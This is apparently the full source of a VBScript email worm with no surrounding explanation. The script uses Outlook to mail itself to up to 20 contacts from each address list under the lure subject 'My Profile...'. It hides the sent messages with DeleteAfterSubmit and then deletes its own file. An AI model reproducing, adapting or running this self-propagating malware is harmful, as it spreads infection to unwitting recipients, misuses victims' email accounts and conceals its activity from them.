On Error Resume Next
set wshshell = Wscript.Createobject("Wscript.Shell")
Set Agustin = CreateObject("outlook.application")
Agustin_0 = Wscript.ScriptFullName
If Agustin <> "" Then
Set Agustin_2 = Agustin.GetNameSpace("MAPI")
For Agustin_3 = 1 To Agustin_2.AddressLists.Count
Set Agustin_4 = Agustin_2.AddressLists(Agustin_3)
Agustin_5 = 1
Set Agustin_6 = Agustin.CreateItem(0)
For Agustin_7 = 1 To Agustin_4.AddressEntries.Count
Agustin_8 = Agustin_4.AddressEntries(Agustin_5)
Agustin_6.Recipients.Add Agustin_8
Agustin_5 = Agustin_5 + 1
If Agustin_5 > 20 Then Exit For
Next
Agustin_6.Subject = "My Profile..."
Agustin_6.Body = "Here is my new address, mail and phone (office and work)..."
Agustin_6.Attachments.Add Agustin_0
Agustin_6.DeleteAfterSubmit = True
Agustin_6.Send
Agustin_8 = ""
Next
End If
Set Agustin_9 = CreateObject("Scripting.FileSystemObject")
Agustin_9.DeleteFile Wscript.ScriptFullName
